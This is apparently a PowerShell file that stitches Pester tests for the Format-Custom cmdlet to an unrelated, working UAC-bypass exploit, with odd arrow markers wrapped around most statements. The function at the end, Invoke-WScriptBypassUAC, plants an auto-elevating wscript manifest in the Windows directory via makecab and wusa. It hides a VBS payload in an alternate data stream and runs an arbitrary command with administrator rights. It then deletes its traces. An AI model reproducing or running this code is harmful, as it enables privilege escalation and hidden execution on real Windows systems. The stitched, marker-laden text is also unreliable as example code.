

 -||-> Describe "Format-Custom" -Tags "CI" {

     -||-> Context "Check Format-Custom aliases" {

         -||-> It "Should have the same output between the alias and the unaliased function" {
             -||-> $nonaliased =  -||-> Get-FormatData | Format-Custom <-||-  <-||- 
             -||-> $aliased    =  -||-> Get-FormatData | fc <-||-  <-||- 
             -||-> $( -||-> $nonaliased | Out-String <-||- ).CompareTo($( -||-> $aliased | Out-String <-||- )) | Should -Be 0 <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Check specific flags on Format-Custom" {

         -||-> It "Should be able to specify the depth in output" {
             -||-> $getprocesspester =   -||-> Get-FormatData | Format-Custom -depth 1 <-||-  <-||- 
             -||-> ( -||-> $getprocesspester <-||- ).Count | Should -BeGreaterThan 0 <-||- 
        } <-||- 

         -||-> It "Should be able to use the Property flag to select properties" {
             -||-> Get-Command | Format-Custom -Property "Name" | Should -Not -Match "Source" <-||- 
        } <-||- 

    } <-||- 
} <-||- 

 -||-> Describe "Format-Custom DRT basic functionality" -Tags "CI" {
	 -||-> Add-Type -TypeDefinition @"
    public abstract class NamedItem
    {
        public string name;
    }

    public abstract class MyContainerBase : NamedItem
    {
        public System.Collections.Generic.List<NamedItem> children = new System.Collections.Generic.List<NamedItem> ();
    }

    public sealed class MyLeaf1 : NamedItem
    {
        public int val1 = 0;
    }

    public sealed class MyLeaf2 : NamedItem
    {
        public int val2 = 0;
    }

    public sealed class MyContainer1 : MyContainerBase
    {
        public string data1;
    }

    public sealed class MyContainer2 : MyContainerBase
    {
        public string data2;
    }
"@ <-||- 

     -||-> It "Format-Custom with subobject should work" {
         -||-> $expectResult1 = "this is the name" <-||- 
         -||-> $expectResult2 = "this is the name of the sub object" <-||- 
         -||-> $testObject = @{} <-||- 
         -||-> $testObject.name = $expectResult1 <-||- 
         -||-> $testObject.subObjectValue = @{} <-||- 
         -||-> $testObject.subObjectValue.name = $expectResult2 <-||- 
         -||-> $testObject.subObjectValue.array = ( -||-> 0..63 <-||- ) <-||- 
         -||-> $testObject.subObjectValue.stringarray = @( -||-> "one","two" <-||- ) <-||- 
         -||-> $result =  -||-> $testObject | Format-Custom | Out-String <-||-  <-||- 
         -||-> $result | Should -Match $expectResult1 <-||- 
         -||-> $result | Should -Match $expectResult2 <-||- 
         -||-> $result | Should -Match "one" <-||- 
         -||-> $result | Should -Match "two" <-||- 
    } <-||- 

	 -||-> It "Format-Custom with Tree Object should work" {
		 -||-> $expectedResult=@"
class MyContainer1
{
  data1 = data 1
  children =
    [
      class MyLeaf1
      {
        val1 = 10
        name = leaf 1
      }
      class MyLeaf2
      {
        val2 = 20
        name = leaf 2
      }
    ]

  name = container 1
}

class MyContainer2
{
  data2 = data 2
  children =
    [
      class MyLeaf1
      {
        val1 = 10
        name = leaf 1
      }
      class MyLeaf2
      {
        val2 = 20
        name = leaf 2
      }
    ]

  name = container 2
}

class MyContainer2
{
  data2 = data 2 deep
  children =
    [
      class MyContainer1
      {
        data1 = cx data
        children =
          [
            class MyLeaf1
            {
              val1 = 10
              name = leaf 1
            }
            class MyLeaf2
            {
              val2 = 20
              name = leaf 2
            }
          ]

        name = cx
      }
    ]

  name = container 2 deep
}

class MyContainer1
{
  data1 = cx data
  children =
    [
      class MyLeaf1
      {
        val1 = 10
        name = leaf 1
      }
      class MyLeaf2
      {
        val2 = 20
        name = leaf 2
      }
    ]

  name = cx
}
"@ <-||- 
		 -||-> $leaf1 =  -||-> New-Object MyLeaf1 <-||-  <-||- 
		 -||-> $leaf1.name = "leaf 1" <-||- 
		 -||-> $leaf1.val1 = 10 <-||- 

		 -||-> $leaf2 =  -||-> New-Object MyLeaf2 <-||-  <-||- 
		 -||-> $leaf2.name = "leaf 2" <-||- 
		 -||-> $leaf2.val2 = 20 <-||- 

		 -||-> $c1 =  -||-> New-Object MyContainer1 <-||-  <-||- 
		 -||-> $c1.name = "container 1" <-||- 
		 -||-> $c1.data1 = "data 1" <-||- 
		 -||-> $c1.children.Add($leaf1) <-||- 
		 -||-> $c1.children.Add($leaf2) <-||- 

		 -||-> $c2 =  -||-> New-Object MyContainer2 <-||-  <-||- 
		 -||-> $c2.name = "container 2" <-||- 
		 -||-> $c2.data2 = "data 2" <-||- 
		 -||-> $c2.children.Add($leaf1) <-||- 
		 -||-> $c2.children.Add($leaf2) <-||- 

		 -||-> $cDeep =  -||-> New-Object MyContainer2 <-||-  <-||- 
		 -||-> $cDeep.name = "container 2 deep" <-||- 
		 -||-> $cDeep.data2 = "data 2 deep" <-||- 

		 -||-> $cx=  -||-> New-Object MyContainer1 <-||-  <-||- 
		 -||-> $cx.name = "cx" <-||- 
		 -||-> $cx.data1 = "cx data" <-||- 
		 -||-> $cx.children.Add($leaf1) <-||- 
		 -||-> $cx.children.Add($leaf2) <-||- 
		 -||-> $cDeep.children.Add($cx) <-||- 

		 -||-> $objectList = @( -||-> $c1,$c2,$cDeep,$cx <-||- ) <-||- 
		 -||-> $result =  -||-> $objectList | Format-Custom | Out-String <-||-  <-||- 
		 -||-> $result = $result -replace "[{} `n\r]","" <-||- 
		 -||-> $expectedResult = $expectedResult -replace "[{} `n\r]","" <-||- 
		 -||-> $result | Should -Be $expectedResult <-||- 
	} <-||- 

	 -||-> It "Format-Custom with Empty Data Tree Object should work" {
		 -||-> $expectedResult=@"
class MyContainer1
{
  data1 =
  children =
  name =
}
"@ <-||- 

		 -||-> $c=  -||-> New-Object MyContainer1 <-||-  <-||- 
		 -||-> $c.name = $null <-||- 
		 -||-> $c.data1 = $null <-||- 
		 -||-> $c.children = $null <-||- 
		 -||-> $objectList = @( -||-> $c <-||- ) <-||- 

		 -||-> $result =  -||-> $objectList | Format-Custom | Out-String <-||-  <-||- 
		 -||-> $result = $result -replace "[{} `n\r]","" <-||- 
		 -||-> $expectedResult = $expectedResult -replace "[{} `n\r]","" <-||- 
		 -||-> $result | Should -Be $expectedResult <-||- 
	} <-||- 

	 -||-> It "Format-Custom with Back Pointers Tree Object should work" {
		 -||-> $expectedResult=@"
class MyContainer1
{
  data1 =
  children =
    [
      class MyContainer1
      {
        data1 =
        children =
          [
            class MyContainer1
            {
              data1 =
              children =
                [
                  MyContainer1
                ]

              name = ROOT
            }
          ]

        name = ROOT
      }
    ]

  name = ROOT
}
"@ <-||- 

		 -||-> $root=  -||-> New-Object MyContainer1 <-||-  <-||- 
		 -||-> $root.name = "ROOT" <-||- 
		 -||-> $root.children.Add($root) <-||- 
		 -||-> $objectList = @( -||-> $root <-||- ) <-||- 

		 -||-> $result =  -||-> $objectList | Format-Custom | Out-String <-||-  <-||- 
		 -||-> $result = $result -replace "[{} `n\r]","" <-||- 
		 -||-> $expectedResult = $expectedResult -replace "[{} `n\r]","" <-||- 
		 -||-> $result | Should -Be $expectedResult <-||- 
	} <-||- 

	 -||-> It "Format-Custom with Leaf Only Data should work" {
		 -||-> $expectedResult=@"
class MyLeaf1
{
  val1 = 10
  name = leaf 1
}

class MyLeaf2
{
  val2 = 20
  name = leaf 2
}
"@ <-||- 

		 -||-> $leaf1 =  -||-> New-Object MyLeaf1 <-||-  <-||- 
		 -||-> $leaf1.name = "leaf 1" <-||- 
		 -||-> $leaf1.val1 = 10 <-||- 

		 -||-> $leaf2 =  -||-> New-Object MyLeaf2 <-||-  <-||- 
		 -||-> $leaf2.name = "leaf 2" <-||- 
		 -||-> $leaf2.val2 = 20 <-||- 

		 -||-> $objectList = @( -||-> $leaf1,$leaf2 <-||- ) <-||- 
		 -||-> $result =  -||-> $objectList | Format-Custom | Out-String <-||-  <-||- 
		 -||-> $result = $result -replace "[{} `n\r]","" <-||- 
		 -||-> $expectedResult = $expectedResult -replace "[{} `n\r]","" <-||- 
		 -||-> $result | Should -Be $expectedResult <-||- 
	} <-||- 
} <-||- 

 -||-> Describe "Format-Custom with expression based EntrySelectedBy in a CustomControl" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $formatFilePath =  -||-> Join-Path $TestDrive 'UpdateFormatDataTests.format.ps1xml' <-||-  <-||- 
         -||-> $xmlContent = @'
<?xml version="1.0" encoding="UTF-8" ?>
<Configuration>
    <Controls>
        <Control>
            <Name>MyTestControl</Name>
            <CustomControl>
                <CustomEntries>
                    <CustomEntry>
                        <EntrySelectedBy>
                            <SelectionCondition>
                                <TypeName>MyTestObject</TypeName>
                                <ScriptBlock>$_.Name -eq 'SelectScriptBlock'</ScriptBlock>
                            </SelectionCondition>
                        </EntrySelectedBy>
                        <CustomItem>
                            <Text>Entry selected by ScriptBlock</Text>
                        </CustomItem>
                    </CustomEntry>
                    <CustomEntry>
                        <EntrySelectedBy>
                            <SelectionCondition>
                                <TypeName>MyTestObject</TypeName>
                                <PropertyName>SelectProperty</PropertyName>
                            </SelectionCondition>
                        </EntrySelectedBy>
                        <CustomItem>
                            <Text>Entry selected by property</Text>
                        </CustomItem>
                    </CustomEntry>
                    <CustomEntry>
                        <CustomItem>
                            <Text>Default was picked</Text>
                        </CustomItem>
                    </CustomEntry>
                </CustomEntries>
            </CustomControl>
        </Control>
    </Controls>
    <ViewDefinitions>
        <View>
            <Name>DefaultView</Name>
            <ViewSelectedBy>
                <TypeName>MyTestObject</TypeName>
            </ViewSelectedBy>
            <GroupBy>
                <PropertyName>Name</PropertyName>
                <CustomControlName>MyTestControl</CustomControlName>
            </GroupBy>
            <TableControl>
                <TableHeaders>
                    <TableColumnHeader />
                </TableHeaders>
                <TableRowEntries>
                    <TableRowEntry>
                        <TableColumnItems>
                            <TableColumnItem>
                                <PropertyName>Name</PropertyName>
                            </TableColumnItem>
                        </TableColumnItems>
                    </TableRowEntry>
                </TableRowEntries>
            </TableControl>
        </View>
    </ViewDefinitions>
</Configuration>
'@ <-||- 

         -||-> Set-Content -Path $formatFilePath -Value $xmlContent <-||- 
         -||-> $ps = [powershell]::Create() <-||- 
         -||-> $iss = [initialsessionstate]::CreateDefault2() <-||- 
         -||-> $iss.Formats.Add($formatFilePath) <-||- 
         -||-> $rs = [runspacefactory]::CreateRunspace($iss) <-||- 
         -||-> $rs.Open() <-||- 
         -||-> $ps.Runspace = $rs <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> $rs.Close() <-||- 
         -||-> $ps.Dispose() <-||- 
    } <-||- 

     -||-> It 'Property expression binding should be able to access the current object' {
         -||-> $script = {
             -||-> [PSCustomObject]@{
                PSTypeName =  -||-> 'MyTestObject' <-||- 
                SelectProperty =  -||-> $true <-||- 
                Name =  -||-> 'testing' <-||- 
            } <-||- 
        } <-||- 

         -||-> $null = $ps.AddScript($script).AddCommand('Out-String') <-||- 
         -||-> $ps.Streams.Error.Clear() <-||- 
         -||-> $expectedOutput = @'


Entry selected by property

Name
----
testing


'@ -replace '\r?\n', "^" <-||- 

         -||-> $ps.Invoke() -replace '\r?\n', "^" | Should -BeExactly $expectedOutput <-||- 
         -||-> $ps.Streams.Error | Should -BeNullOrEmpty <-||- 
    } <-||- 

     -||-> It 'ScriptBlock expression binding should be able to access the current object' {
         -||-> $script = {
             -||-> [PSCustomObject]@{
                PSTypeName =  -||-> 'MyTestObject' <-||- 
                SelectProperty =  -||-> $false <-||- 
                Name =  -||-> 'SelectScriptBlock' <-||- 
            } <-||- 
        } <-||- 

         -||-> $null = $ps.AddScript($script).AddCommand('Out-String') <-||- 
         -||-> $ps.Streams.Error.Clear() <-||- 
         -||-> $expectedOutput = @'


Entry selected by ScriptBlock

Name
----
SelectScriptBlock


'@ -replace '\r?\n', "^" <-||- 

         -||-> $ps.Invoke() -replace '\r?\n', "^" | Should -BeExactly $expectedOutput <-||- 
         -||-> $ps.Streams.Error | Should -BeNullOrEmpty <-||- 
    } <-||- 
} <-||- 
 -||-> function Invoke-WScriptBypassUAC
{
    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]
        $payload
    )

     -||-> function Local:Get-TempFileName {
        
         -||-> $sTempFolder = $env:Temp <-||- 
         -||-> $sTempFolder = $sTempFolder + "\" <-||- 
         -||-> $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp" <-||- 
         -||-> $sTempFileName = $sTempFileName -split '\.',( -||-> [regex]::matches($sTempFileName,"\.").count <-||- ) -join '' <-||- 
         -||-> $sTempFileNameFinal = $sTempFolder + $sTempFileName <-||-  
        return  -||-> $sTempFileNameFinal <-||- 
    } <-||- 

     -||-> function Local:Invoke-CopyFile($sSource, $sTarget) {
       
        -||-> $sTempFile =  -||-> Get-TempFileName <-||-  <-||- 
        -||-> Start-Process -WindowStyle Hidden -FilePath "$( -||-> $env:WINDIR <-||- )\System32\makecab.exe" -ArgumentList "$sSource $sTempFile" <-||- 
        -||-> $null =  -||-> wusa "$sTempFile" /extract:"$sTarget" /quiet <-||-  <-||- 

       
        -||-> Start-Sleep -s 2 <-||- 
       
       
        -||-> Remove-Item $sTempFile <-||- 
   } <-||- 

     -||-> function Local:Invoke-WscriptTrigger {
        
         -||-> $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs" <-||- 
         -||-> $ADSFile = $VBSFileName -split '\.',( -||-> [regex]::matches($VBSFileName,"\.").count <-||- ) -join '' <-||- 

         -||-> $VBSPayload = "Dim objShell:" <-||- 
         -||-> $VBSPayload += "Dim oFso:" <-||- 
         -||-> $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):" <-||- 
         -||-> $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):" <-||- 
         -||-> $VBSPayload += "command = ""$payload"":" <-||- 
         -||-> $VBSPayload += "objShell.Run command, 0:" <-||- 
        
        
         -||-> $DelCommand = "$( -||-> $env:WINDIR <-||- )\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $( -||-> $env:WINDIR <-||- )\wscript.exe&&del $( -||-> $env:WINDIR <-||- )\wscript.exe.manifest""""""""" <-||- 
         -||-> $VBSPayload += "command = ""$DelCommand"":" <-||- 
         -||-> $VBSPayload += "objShell.Run command, 0:" <-||- 
         -||-> $VBSPayload += "Set objShell = Nothing" <-||- 

         -||-> $CreateWrapperADS = { -||-> cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile""" <-||- } <-||- 
         -||-> Invoke-Command -ScriptBlock $CreateWrapperADS <-||- 
        
         -||-> $ExecuteScript = { -||-> cmd /C "$( -||-> $env:WINDIR <-||- )\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile""" <-||- } <-||- 
         -||-> Invoke-Command -ScriptBlock $ExecuteScript <-||- 
         -||-> Remove-ADS $env:USERPROFILE\AppData:$ADSFile <-||- 
    } <-||- 

     -||-> function Local:Invoke-WscriptElevate {

         -||-> $WscriptManifest =
@"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0">
  <asmv3:trustInfo>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </asmv3:trustInfo>
  <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
      <autoElevate>true</autoElevate>
      <dpiAware>true</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"@ <-||- 

        
         -||-> $sManifest = $env:Temp + "\wscript.exe.manifest" <-||- 
         -||-> $WscriptManifest | Out-File $sManifest -Encoding UTF8 <-||- 

         -||-> Invoke-CopyFile $sManifest $env:WINDIR <-||- 

         -||-> $WScriptPath = "$( -||-> $env:WINDIR <-||- )\System32\wscript.exe" <-||- 
         -||-> Invoke-CopyFile $WScriptPath $env:WINDIR <-||- 
         -||-> Remove-Item -Force $sManifest <-||- 

        
         -||-> Invoke-WscriptTrigger <-||- 
    } <-||- 

     -||-> function Local:Remove-ADS {
        
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [string]$ADSPath
        )
     
        
        
         -||-> $DynAssembly =  -||-> New-Object System.Reflection.AssemblyName( -||-> 'Win32' <-||- ) <-||-  <-||- 
         -||-> $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run) <-||- 
         -||-> $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False) <-||- 
     
         -||-> $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class') <-||- 
         -||-> $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@( -||-> [String] <-||- )) <-||- 
         -||-> $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError') <-||- 
         -||-> $SetLastErrorCustomAttribute =  -||-> New-Object Reflection.Emit.CustomAttributeBuilder( -||-> $DllImportConstructor,
            @( -||-> 'kernel32.dll' <-||- ),
            [Reflection.FieldInfo[]]@( -||-> $SetLastError <-||- ),
            @( -||-> $True <-||- ) <-||- ) <-||-  <-||- 
     
        
         -||-> $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
            'kernel32.dll',
            ( -||-> [Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static <-||- ),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@( -||-> [String] <-||- ),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi) <-||- 
         -||-> $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute) <-||- 
        
         -||-> $Kernel32 = $TypeBuilder.CreateType() <-||- 
        
         -||-> $Result = $Kernel32::DeleteFile($ADSPath) <-||- 

         -||-> if ( -||-> $Result <-||- ){
             -||-> Write-Verbose "Alternate Data Stream at $ADSPath successfully removed." <-||- 
        }
        else{
             -||-> Write-Verbose "Alternate Data Stream at $ADSPath removal failure!" <-||- 
        } <-||- 
    } <-||- 

    
     -||-> $OSVersion = [Environment]::OSVersion.Version <-||- 
     -||-> if ( -||-> ( -||-> $OSVersion -ge ( -||-> New-Object 'Version' 6,0 <-||- ) <-||- ) -and ( -||-> $OSVersion -lt ( -||-> New-Object 'Version' 6,2 <-||- ) <-||- ) <-||- ){
         -||-> if( -||-> ( -||-> [Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent() <-||- ).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True <-||- ){
             -||-> "[!] WARNING: You are already elevated!" <-||- 
        }
        else {
             -||-> Invoke-WscriptElevate <-||- 
        } <-||- 
    }else{ -||-> "[!] WARNING: Target Not Vulnerable" <-||- } <-||- 
} <-||- 


